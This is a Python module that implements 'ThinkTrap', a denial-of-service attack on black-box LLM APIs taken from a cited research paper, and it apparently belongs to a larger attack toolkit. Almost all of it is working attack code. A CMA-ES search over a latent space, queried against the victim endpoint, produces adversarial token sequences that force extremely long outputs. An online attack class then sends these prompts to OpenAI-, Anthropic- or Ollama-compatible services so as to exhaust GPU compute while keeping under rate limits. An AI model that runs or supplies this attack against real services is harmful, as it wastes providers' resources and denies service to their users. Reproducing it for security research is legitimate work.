"""
attacks/think_trap.py — ThinkTrap DoS attack module.

Based on: "ThinkTrap: Denial-of-Service Attacks against Black-box LLM Services
via Infinite Thinking" (Li et al., 2025 / NDSS 2026)
https://arxiv.org/abs/2512.07086

Attack overview — two phases
-----------------------------
Phase 1 · Offline Attack Prompt Generation (APG)
  A CMA-ES black-box optimiser searches a low-dimensional latent space R^m
  to craft adversarial token sequences that maximise the victim's output
  token count.  The search pipeline:

    LEP  – project latent vector z ∈ R^m to continuous embeddings via a
           fixed random matrix A ∈ R^(L·d × m), entries ~ N(0, 1/m)
    SPD  – decode continuous embeddings to discrete tokens by nearest-
           neighbour search inside the surrogate model's embedding table T_sur
    LQ   – query the victim API (black-box), read scalar output length o_t
    DFO  – CMA-ES update: maximise L(z) = o_t

  Only scalar feedback (output token count) is required — no logits, no
  gradients, no white-box access.  Cross-model transferability is strong for
  models sharing the same tokenisation / SFT dataset lineage.

Phase 2 · Online DoS Service Attack (DSA)
  Pre-crafted prompts are injected at the target API (≤ 10 RPM to stay
  inside typical rate limits) to exhaust backend GPU compute.

Usage — generate prompts first
--------------------------------
    from attacks.think_trap import ThinkTrapAPG, ThinkTrapConfig, make_victim_fn

    cfg = ThinkTrapConfig(surrogate_model="meta-llama/Llama-2-7b-hf")
    T, tok = load_surrogate_embeddings(cfg.surrogate_model)
    victim = make_victim_fn(target_config, max_tokens=4096)

    apg = ThinkTrapAPG(victim_fn=victim, T_surrogate=T, config=cfg, tokenizer=tok)
    await apg.run()
    apg.save("prompts/thinktrap_prompts.json")

Then run the online attack:
    attack = ThinkTrapAttack(attack_config, tt_config=cfg)
    result = await attack.run()
"""

from __future__ import annotations

import asyncio
import datetime
import json
import logging
import random
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Awaitable, Callable, Optional, Tuple

import aiohttp
import numpy as np

from core.base_attack import (
    APIFormat,
    AttackConfig,
    AttackResult,
    BaseAttack,
    TargetConfig,
)

log = logging.getLogger(__name__)

# ─────────────────────────────────────────────
# Paper defaults
# ─────────────────────────────────────────────

DEFAULT_PROMPT_LENGTH = 20   # L — adversarial sequence length (tokens)
DEFAULT_LATENT_DIM    = 20   # m — CMA-ES search space dimension
DEFAULT_SIGMA         = 1.0  # σ₀ — initial CMA-ES step size
DEFAULT_QUERY_BUDGET  = 200  # max victim API queries during APG


# ─────────────────────────────────────────────
# Config
# ─────────────────────────────────────────────

@dataclass
class ThinkTrapConfig:
    """
    Configuration for both the offline APG phase and the online DSA phase.

    DSA parameters (prompt file + selection)
    -----------------------------------------
    prompts_file    Path to the JSON cache produced by ThinkTrapAPG.save().
    prompt_index    Fixed index into the cache, or None for random selection.
    system_prompt   Optional system prompt prepended to every request.
    verbose_stream  Print token deltas to stdout while streaming.

    APG parameters (CMA-ES optimisation)
    --------------------------------------
    prompt_length           L  — token-sequence length to optimise (default 20).
    latent_dim              m  — CMA-ES search dimensionality (default 20).
    cmaes_sigma             σ₀ — initial CMA-ES step size (default 1.0).
    query_budget            Maximum API calls during optimisation (default 200).
    surrogate_model         HuggingFace model used to obtain the embedding table.
    surrogate_embeddings_path  Path to a pre-saved .npy embedding matrix;
                            skips loading the HF model if provided.
    top_k_keep              Number of top-scoring prompts to retain.
    """

    # ── DSA ──────────────────────────────────
    prompts_file:   str            = "../prompts/thinktrap_prompts.json"
    prompt_index:   Optional[int]  = None
    system_prompt:  Optional[str]  = None
    verbose_stream: bool           = False

    # ── APG ──────────────────────────────────
    prompt_length:              int   = DEFAULT_PROMPT_LENGTH
    latent_dim:                 int   = DEFAULT_LATENT_DIM
    cmaes_sigma:                float = DEFAULT_SIGMA
    query_budget:               int   = DEFAULT_QUERY_BUDGET
    surrogate_model:            str   = "meta-llama/Llama-2-7b-hf"
    surrogate_embeddings_path:  Optional[str] = None
    top_k_keep:                 int   = 10


# ─────────────────────────────────────────────
# Prompt Cache
# ─────────────────────────────────────────────

class ThinkTrapPromptCache:
    """
    Loads and saves optimised adversarial prompt entries.

    File schema
    -----------
    {
        "meta": {
            "surrogate_model": "...",
            "prompt_length": 20,
            "latent_dim": 20,
            "query_budget": 200,
            "seed": 42,
            "created_at": "2025-12-01T00:00:00Z"
        },
        "prompts": [
            {"tokens": [42, 7, ...], "score": 3891, "text": "..."},
            ...
        ]
    }

    Prompts are sorted by descending score (highest-amplification first).
    """

    def __init__(self, path: str) -> None:
        self.path      = Path(path)
        self._prompts: list[dict] = []
        self._meta:    dict       = {}
        if self.path.exists():
            self._load()

    def _load(self) -> None:
        with self.path.open("r", encoding="utf-8") as fh:
            raw = json.load(fh)
        self._meta    = raw.get("meta", {})
        self._prompts = raw.get("prompts", [])

    def save(self, prompts: list[dict], meta: dict) -> None:
        self.path.parent.mkdir(parents=True, exist_ok=True)
        with self.path.open("w", encoding="utf-8") as fh:
            json.dump({"meta": meta, "prompts": prompts}, fh, indent=2)
        self._prompts = prompts
        self._meta    = meta

    def get(self, index: Optional[int] = None) -> dict:
        """Return a stored adversarial prompt entry (random if index is None)."""
        if not self._prompts:
            raise ValueError(
                f"No adversarial prompts found at {self.path}.\n"
                "Generate them first with ThinkTrapAPG:\n"
                "    apg = ThinkTrapAPG(victim_fn, T_surrogate, config)\n"
                "    await apg.run()\n"
                "    apg.save('prompts/thinktrap_prompts.json')"
            )
        if index is not None:
            return self._prompts[index % len(self._prompts)]
        return random.choice(self._prompts)

    def count(self) -> int:
        return len(self._prompts)

    @property
    def meta(self) -> dict:
        return self._meta

    def __repr__(self) -> str:
        return (
            f"<ThinkTrapPromptCache path={self.path.name!r} "
            f"n={len(self._prompts)}>"
        )


# ─────────────────────────────────────────────
# Low-rank Embedding Projection (LEP)
# ─────────────────────────────────────────────

def build_projection_matrix(
    latent_dim: int,
    prompt_length: int,
    embed_dim: int,
    rng: Optional[np.random.Generator] = None,
) -> np.ndarray:
    """
    Build the fixed random projection matrix A ∈ R^(L·d × m).

    Entries are drawn as A_ij ~ N(0, 1/m) so that the projected embeddings
    have unit expected variance per dimension.  A fixed seed allows the same
    matrix to be reproduced on different machines.

    Returns shape (L·d, m), dtype float32.
    """
    if rng is None:
        rng = np.random.default_rng()
    total_dim = prompt_length * embed_dim
    A = rng.standard_normal((total_dim, latent_dim)) / np.sqrt(latent_dim)
    return A.astype(np.float32)


# ─────────────────────────────────────────────
# Surrogate Prompt Decoding (SPD)
# ─────────────────────────────────────────────

def decode_embeddings_to_tokens(
    E_flat: np.ndarray,
    T_surrogate: np.ndarray,
    prompt_length: int,
    embed_dim: int,
) -> list[int]:
    """
    Nearest-neighbour token decoding (SPD step from the paper).

    For each token position i, find the vocabulary entry whose embedding is
    closest to the continuous target e_i:

        w_i = argmin_{j ∈ V}  ‖e_i − T_sur[j]‖₂²

    Exploits the empirical observation that embedding spaces across different
    models sharing the same tokenisation lineage are sufficiently aligned for
    cross-model transfer.

    Parameters
    ----------
    E_flat      : 1-D array of shape (L·d,) — output of the LEP step.
    T_surrogate : 2-D array of shape (|V|, d) — surrogate token embeddings.
    prompt_length, embed_dim : L and d from the paper.
    """
    tokens: list[int] = []
    for i in range(prompt_length):
        e_i       = E_flat[i * embed_dim : (i + 1) * embed_dim]   # (d,)
        diffs     = T_surrogate - e_i[np.newaxis, :]               # (|V|, d)
        distances = (diffs * diffs).sum(axis=1)                    # (|V|,)
        tokens.append(int(np.argmin(distances)))
    return tokens


# ─────────────────────────────────────────────
# Surrogate embedding loader
# ─────────────────────────────────────────────

def load_surrogate_embeddings(
    model_name: str,
    embeddings_path: Optional[str] = None,
    hf_token: Optional[str] = None,
) -> Tuple[np.ndarray, Any]:
    """
    Load the input token embedding matrix from a surrogate LLM.

    If *embeddings_path* (.npy file) is given it is loaded directly, avoiding
    the need to download the full model weights.  Otherwise the HuggingFace
    model is fetched (requires ``transformers`` + ``torch``).

    Returns
    -------
    T          : np.ndarray, shape (vocab_size, embed_dim), dtype float32.
    tokenizer  : HF tokenizer used to decode token ids back to text, or None
                 if loading from a pre-saved .npy file.

    Saving the matrix for later reuse
    -----------------------------------
    ::

        T, tok = load_surrogate_embeddings("meta-llama/Llama-2-7b-hf")
        np.save("llama2_embeddings.npy", T)
        # Next time:
        T, _ = load_surrogate_embeddings("", embeddings_path="llama2_embeddings.npy")
    """
    if embeddings_path:
        p = Path(embeddings_path)
        if not p.exists():
            raise FileNotFoundError(f"Surrogate embeddings not found: {p}")
        T = np.load(str(p)).astype(np.float32)
        log.info("Loaded surrogate embeddings from %s  shape=%s", p, T.shape)
        return T, None

    try:
        from transformers import AutoTokenizer, AutoModel  # type: ignore
        import torch                                        # type: ignore
    except ImportError as exc:
        raise ImportError(
            "ThinkTrap APG requires `transformers` and `torch` to load the "
            "surrogate embedding table.\n"
            "Install:  pip install transformers torch\n"
            "Or pre-save the matrix and pass surrogate_embeddings_path."
        ) from exc

    log.info("Loading surrogate model %r …", model_name)
    tokenizer = AutoTokenizer.from_pretrained(model_name, token=hf_token)
    # float16 halves peak RAM (e.g. LLaMA-2-7B: 28 GB → 14 GB).
    # We only need the embedding matrix, so the model is freed immediately after.
    model = AutoModel.from_pretrained(
        model_name,
        torch_dtype=torch.float16,
        low_cpu_mem_usage=True,
        token=hf_token,
    )
    model.eval()

    with torch.no_grad():
        # Works for any decoder-only transformer (LLaMA, Mistral, Falcon …).
        T = model.get_input_embeddings().weight.float().cpu().numpy()

    del model  # release weights — only the embedding table is kept
    torch.cuda.empty_cache() if torch.cuda.is_available() else None

    T = T.astype(np.float32)
    log.info("Loaded embedding table  shape=%s", T.shape)
    return T, tokenizer


# ─────────────────────────────────────────────
# Victim function factory
# ─────────────────────────────────────────────

def make_victim_fn(
    target: TargetConfig,
    max_tokens: int = 4096,
    tokenizer: Optional[Any] = None,
) -> Callable[[list[int]], Awaitable[int]]:
    """
    Create an async callable ``victim_fn(token_ids) -> int`` suitable for use
    with ThinkTrapAPG.

    The function decodes *token_ids* back to text (using *tokenizer* if
    provided, otherwise joining as space-separated integers), submits a
    non-streaming chat-completion request to *target*, and returns the number
    of completion tokens produced.

    Parameters
    ----------
    target      : TargetConfig for the victim endpoint.
    max_tokens  : max_tokens parameter forwarded to the victim API.
    tokenizer   : Optional HF tokenizer for converting token ids to text.
    """
    def _ids_to_text(ids: list[int]) -> str:
        if tokenizer is not None:
            try:
                return tokenizer.decode(ids, skip_special_tokens=True)
            except Exception:
                pass
        return " ".join(str(t) for t in ids)

    async def _victim(token_ids: list[int]) -> int:
        import json as _json
        prompt_text = _ids_to_text(token_ids)
        payload: dict[str, Any] = {
            "model":          target.model,
            "messages":       [{"role": "user", "content": prompt_text}],
            "max_tokens":     max_tokens,
            "temperature":    1.0,  # non-zero temperature for diverse outputs
            "stream":         True,
            "stream_options": {"include_usage": True},
        }
        timeout   = aiohttp.ClientTimeout(total=target.timeout)
        connector = aiohttp.TCPConnector(ssl=target.verify_ssl)
        headers   = {"Content-Type": "application/json", **target.auth_headers}

        try:
            completion_tokens = 0
            async with aiohttp.ClientSession(
                connector=connector, timeout=timeout
            ) as session:
                async with session.post(
                    target.endpoint, json=payload, headers=headers
                ) as resp:
                    if resp.status >= 400:
                        log.warning("Victim API returned HTTP %d", resp.status)
                        return 0
                    # Consume the SSE stream — each incoming chunk keeps the
                    # connection alive, preventing Cloudflare 524 proxy timeouts.
                    # The final chunk (stream_options: include_usage) carries
                    # the authoritative completion_tokens count.
                    async for raw_line in resp.content:
                        line = raw_line.decode().strip()
                        if not line.startswith("data: "):
                            continue
                        data_str = line[6:]
                        if data_str == "[DONE]":
                            break
                        try:
                            chunk = _json.loads(data_str)
                        except Exception:
                            continue
                        usage = chunk.get("usage")
                        if usage:
                            completion_tokens = int(
                                usage.get("completion_tokens")
                                or usage.get("output_tokens")
                                or completion_tokens
                            )
            return completion_tokens
        except Exception as exc:
            log.warning("victim_fn error: %s", exc, exc_info=True)
            return 0

    return _victim


# ─────────────────────────────────────────────
# APG — Offline Attack Prompt Generation
# ─────────────────────────────────────────────

class ThinkTrapAPG:
    """
    Offline Attack Prompt Generation engine.

    Uses CMA-ES (Derivative-Free Optimisation) over a low-rank latent space
    to search for adversarial token sequences that maximise the victim model's
    output length.  Only a scalar fitness signal (output token count) is
    needed — no gradients, logits, or white-box access.

    Algorithm (per generation)
    --------------------------
    1. Sample population z_i ~ N(μ, Σ) from CMA-ES
    2. LEP: E_i = A @ z_i   (latent → flat embedding, shape L·d)
    3. SPD: decode E_i to discrete tokens via nearest-neighbour search
    4. LQ:  o_i = victim_fn(tokens_i)   (async, run concurrently)
    5. DFO: optimizer.tell([(z_i, −o_i), …])   (CMA-ES minimises, so negate)

    Parameters
    ----------
    victim_fn   : async callable  ``(list[int]) -> int``  — submits the
                  decoded token sequence to the victim API and returns the
                  number of output tokens produced.  Use :func:`make_victim_fn`
                  to build one from a :class:`TargetConfig`.
    T_surrogate : np.ndarray, shape (vocab_size, embed_dim) — surrogate
                  model's input embedding matrix (float32).  Use
                  :func:`load_surrogate_embeddings` to obtain it.
    config      : :class:`ThinkTrapConfig` instance.
    tokenizer   : Optional HF tokenizer; used only for human-readable text
                  fields in the saved JSON cache.
    seed        : RNG seed for reproducibility (projection matrix + CMA-ES).
    """

    def __init__(
        self,
        victim_fn:   Callable[[list[int]], Awaitable[int]],
        T_surrogate: np.ndarray,
        config:      ThinkTrapConfig,
        tokenizer:   Optional[Any] = None,
        seed:        int = 42,
    ) -> None:
        self.victim_fn   = victim_fn
        self.T_surrogate = T_surrogate.astype(np.float32)
        self.config      = config
        self.tokenizer   = tokenizer
        self.seed        = seed

        self._embed_dim = T_surrogate.shape[1]
        self._rng       = np.random.default_rng(seed)
        self._A         = build_projection_matrix(
            config.latent_dim,
            config.prompt_length,
            self._embed_dim,
            rng=self._rng,
        )
        self._best_prompts: list[dict] = []

    # ── Internal helpers ──────────────────────

    def _z_to_tokens(self, z: np.ndarray) -> list[int]:
        """LEP + SPD pipeline: latent vector → discrete token ids."""
        E_flat = self._A @ z
        return decode_embeddings_to_tokens(
            E_flat,
            self.T_surrogate,
            self.config.prompt_length,
            self._embed_dim,
        )

    def _ids_to_text(self, token_ids: list[int]) -> str:
        if self.tokenizer is None:
            return " ".join(str(t) for t in token_ids)
        try:
            return self.tokenizer.decode(token_ids, skip_special_tokens=True)
        except Exception:
            return " ".join(str(t) for t in token_ids)

    # ── Main optimisation loop ─────────────────

    async def run(self) -> list[dict]:
        """
        Execute the CMA-ES optimisation loop and return the top-k prompts.

        Each generation fires ``population_size`` concurrent victim queries.
        Progress is logged at INFO level.

        Returns a list of dicts (sorted by score descending):
            [{"tokens": [...], "score": <int>, "text": "..."}, ...]

        Call :meth:`save` afterwards to persist results.
        """
        try:
            from cmaes import CMA  # type: ignore
        except ImportError as exc:
            raise ImportError(
                "ThinkTrap APG requires the `cmaes` package.\n"
                "Install:  pip install cmaes"
            ) from exc

        cfg    = self.config
        budget = cfg.query_budget
        all_scored: list[Tuple[list[int], int]] = []

        optimizer = CMA(
            mean  = np.zeros(cfg.latent_dim),
            sigma = cfg.cmaes_sigma,
            seed  = self.seed,
            population_size=16,
        )
        queries = 0

        log.info(
            "ThinkTrap APG started — budget=%d L=%d m=%d σ₀=%.2f",
            budget, cfg.prompt_length, cfg.latent_dim, cfg.cmaes_sigma,
        )

        while queries < budget:
            pop_size     = optimizer.population_size
            samples      = [optimizer.ask() for _ in range(pop_size)]
            token_batches = [self._z_to_tokens(z) for z in samples]

            # Query victim API concurrently for all candidates in this generation
            tasks  = [self.victim_fn(toks) for toks in token_batches]
            raw    = await asyncio.gather(*tasks, return_exceptions=True)

            scores: list[int] = []
            for r in raw:
                if isinstance(r, Exception):
                    log.debug("Victim query failed: %s", r)
                    scores.append(0)
                else:
                    scores.append(int(r))

            queries += pop_size

            # CMA-ES minimises → negate the fitness
            optimizer.tell([(z, -float(sc)) for z, sc in zip(samples, scores)])

            for toks, sc in zip(token_batches, scores):
                all_scored.append((toks, sc))

            log.info(
                "Gen %d/%d  best=%d  mean=%.1f",
                queries, budget, max(scores), sum(scores) / len(scores),
            )

        # Retain top-k by score
        all_scored.sort(key=lambda x: x[1], reverse=True)
        top = all_scored[: cfg.top_k_keep]

        self._best_prompts = [
            {
                "tokens": toks,
                "score":  sc,
                "text":   self._ids_to_text(toks),
            }
            for toks, sc in top
        ]
        log.info(
            "APG done.  Top-%d scores: %s",
            cfg.top_k_keep, [p["score"] for p in self._best_prompts],
        )
        return self._best_prompts

    def save(self, path: str) -> None:
        """Persist optimised prompts and run metadata to a JSON cache file."""
        meta = {
            "surrogate_model":  self.config.surrogate_model,
            "prompt_length":    self.config.prompt_length,
            "latent_dim":       self.config.latent_dim,
            "cmaes_sigma":      self.config.cmaes_sigma,
            "query_budget":     self.config.query_budget,
            "seed":             self.seed,
            "created_at":       datetime.datetime.now(datetime.timezone.utc).isoformat(),
        }
        cache = ThinkTrapPromptCache(path)
        cache.save(self._best_prompts, meta)
        log.info("Saved %d prompts → %s", len(self._best_prompts), path)

    @property
    def best_prompts(self) -> list[dict]:
        return self._best_prompts


# ─────────────────────────────────────────────
# Attack Class — DSA (Online phase)
# ─────────────────────────────────────────────

class ThinkTrapAttack(BaseAttack):
    """
    ThinkTrap online Denial-of-Service attack (DSA phase).

    Loads pre-optimised adversarial prompts from a JSON cache produced by
    :class:`ThinkTrapAPG` and submits them to the target API to induce
    pathologically long output sequences, exhausting backend GPU compute.

    Supports OpenAI-compatible, Anthropic, and Ollama endpoints via the
    same multi-format machinery used by :class:`ReasoningBombAttack`.

    Typical workflow
    ----------------
    1. Run :class:`ThinkTrapAPG` once (offline) to generate the prompt cache.
    2. Instantiate :class:`ThinkTrapAttack` and call ``await attack.run()``
       (or use :class:`AttackerInstance` for sustained multi-request loops).

    Reference
    ---------
    "ThinkTrap: Denial-of-Service Attacks against Black-box LLM Services via
    Infinite Thinking" — Li et al., NDSS 2026.
    https://arxiv.org/abs/2512.07086
    """

    def __init__(
        self,
        config:    AttackConfig,
        tt_config: Optional[ThinkTrapConfig] = None,
    ) -> None:
        super().__init__(config)
        self.tt_config       = tt_config or ThinkTrapConfig()
        self._cache          = ThinkTrapPromptCache(self.tt_config.prompts_file)
        self._selected_entry: Optional[dict] = None

    # ── Identity ─────────────────────────────

    @property
    def attack_name(self) -> str:
        return "think_trap"

    # ── Payload construction ──────────────────

    def build_payload(self) -> dict[str, Any]:
        entry = self._cache.get(self.tt_config.prompt_index)
        self._selected_entry = entry

        prompt_text = entry.get("text", "")
        if not prompt_text and "tokens" in entry:
            prompt_text = " ".join(str(t) for t in entry["tokens"])

        self.config.metadata.update({
            "tt_score":          entry.get("score"),
            "tt_prompt_tokens":  len(entry.get("tokens", [])),
            "tt_prompt_preview": prompt_text[:120],
        })

        fmt = self.config.target.api_format
        if fmt == APIFormat.OPENAI:
            return self._openai_payload(prompt_text)
        elif fmt == APIFormat.ANTHROPIC:
            return self._anthropic_payload(prompt_text)
        elif fmt == APIFormat.OLLAMA:
            return self._ollama_payload(prompt_text)
        elif fmt == APIFormat.TEST:
            return self._test_payload()
        else:  # CUSTOM — fall back to OpenAI schema
            return self._openai_payload(prompt_text)

    def _build_messages(self, prompt: str) -> list[dict]:
        messages = []
        if self.tt_config.system_prompt:
            messages.append({"role": "system", "content": self.tt_config.system_prompt})
        messages.append({"role": "user", "content": prompt})
        return messages

    def _openai_payload(self, prompt: str) -> dict[str, Any]:
        payload: dict[str, Any] = {
            "model":       self.config.target.model,
            "messages":    self._build_messages(prompt),
            "max_tokens":  self.config.max_tokens,
            "temperature": self.config.temperature,
            "stream":      self.config.stream,
        }
        if self.config.stream and self.config.target.supports_stream_options:
            payload["stream_options"] = {"include_usage": True}
        return payload

    def _anthropic_payload(self, prompt: str) -> dict[str, Any]:
        payload: dict[str, Any] = {
            "model":      self.config.target.model,
            "messages":   [{"role": "user", "content": prompt}],
            "max_tokens": self.config.max_tokens,
            "stream":     self.config.stream,
        }
        if self.tt_config.system_prompt:
            payload["system"] = self.tt_config.system_prompt
        return payload

    def _ollama_payload(self, prompt: str) -> dict[str, Any]:
        return {
            "model":    self.config.target.model,
            "messages": self._build_messages(prompt),
            "stream":   self.config.stream,
            "options":  {
                "num_predict": self.config.max_tokens,
                "temperature": self.config.temperature,
            },
        }

    def _test_payload(self) -> dict[str, Any]:
        payload: dict[str, Any] = {
            "model":       self.config.target.model,
            "messages":    [{"role": "user", "content": "test"}],
            "max_tokens":  self.config.max_tokens,
            "temperature": self.config.temperature,
            "stream":      self.config.stream,
        }
        if self.config.stream and self.config.target.supports_stream_options:
            payload["stream_options"] = {"include_usage": True}
        return payload

    # ── Streaming parser ──────────────────────

    def parse_stream_chunk(
        self, raw_chunk: str, result: AttackResult
    ) -> Optional[str]:
        try:
            data = json.loads(raw_chunk)
        except json.JSONDecodeError:
            return None

        fmt = self.config.target.api_format
        if fmt == APIFormat.OPENAI:
            return self._parse_openai_chunk(data, result)
        elif fmt == APIFormat.ANTHROPIC:
            return self._parse_anthropic_chunk(data, result)
        elif fmt == APIFormat.OLLAMA:
            return self._parse_ollama_chunk(data, result)
        else:
            return self._parse_openai_chunk(data, result)

    def _parse_openai_chunk(
        self, data: dict, result: AttackResult
    ) -> Optional[str]:
        choices = data.get("choices") or []

        # Final usage chunk — choices is absent or empty
        if not choices:
            if "usage" in data:
                usage = data["usage"]
                result.token_metrics.prompt_tokens     = usage.get("prompt_tokens", 0)
                result.token_metrics.completion_tokens = usage.get("completion_tokens", 0)
                details = usage.get("completion_tokens_details", {})
                result.token_metrics.reasoning_tokens  = details.get("reasoning_tokens", 0)
            return None
        delta = choices[0].get("delta", {})

        # Some providers embed usage in the last content chunk
        if "usage" in data:
            usage = data["usage"]
            result.token_metrics.prompt_tokens     = usage.get("prompt_tokens", 0)
            result.token_metrics.completion_tokens = usage.get("completion_tokens", 0)

        content = delta.get("content") or delta.get("reasoning_content")
        if self.tt_config.verbose_stream and content:
            print(content, end="", flush=True)
        return content if content else None

    def _parse_anthropic_chunk(
        self, data: dict, result: AttackResult
    ) -> Optional[str]:
        event_type = data.get("type", "")
        if event_type == "content_block_delta":
            return data.get("delta", {}).get("text")
        if event_type == "message_delta":
            result.token_metrics.completion_tokens = (
                data.get("usage", {}).get("output_tokens", 0)
            )
        if event_type == "message_start":
            result.token_metrics.prompt_tokens = (
                data.get("message", {}).get("usage", {}).get("input_tokens", 0)
            )
        return None

    def _parse_ollama_chunk(
        self, data: dict, result: AttackResult
    ) -> Optional[str]:
        if data.get("done"):
            result.token_metrics.prompt_tokens     = data.get("prompt_eval_count", 0)
            result.token_metrics.completion_tokens = data.get("eval_count", 0)
            return None
        return data.get("message", {}).get("content")

    # ── Non-streaming parser ──────────────────

    def parse_full_response(
        self, data: dict[str, Any], result: AttackResult
    ) -> None:
        fmt = self.config.target.api_format

        if fmt in (APIFormat.OPENAI, APIFormat.CUSTOM, APIFormat.TEST):
            usage = data.get("usage", {})
            result.token_metrics.prompt_tokens     = usage.get("prompt_tokens", 0)
            result.token_metrics.completion_tokens = usage.get("completion_tokens", 0)
            details = usage.get("completion_tokens_details", {})
            result.token_metrics.reasoning_tokens  = details.get("reasoning_tokens", 0)
            choices = data.get("choices", [])
            if choices:
                result.raw_response = choices[0].get("message", {}).get("content", "")

        elif fmt == APIFormat.ANTHROPIC:
            usage = data.get("usage", {})
            result.token_metrics.prompt_tokens     = usage.get("input_tokens", 0)
            result.token_metrics.completion_tokens = usage.get("output_tokens", 0)
            contents = data.get("content", [])
            result.raw_response = " ".join(
                c.get("text", "") for c in contents if c.get("type") == "text"
            )

        elif fmt == APIFormat.OLLAMA:
            result.token_metrics.prompt_tokens     = data.get("prompt_eval_count", 0)
            result.token_metrics.completion_tokens = data.get("eval_count", 0)
            result.raw_response = data.get("message", {}).get("content", "")

    # ── Accessors ─────────────────────────────

    @property
    def selected_entry(self) -> Optional[dict]:
        """The prompt entry used in the last build_payload() call."""
        return self._selected_entry

    @property
    def cache(self) -> ThinkTrapPromptCache:
        """Direct access to the loaded prompt cache."""
        return self._cache
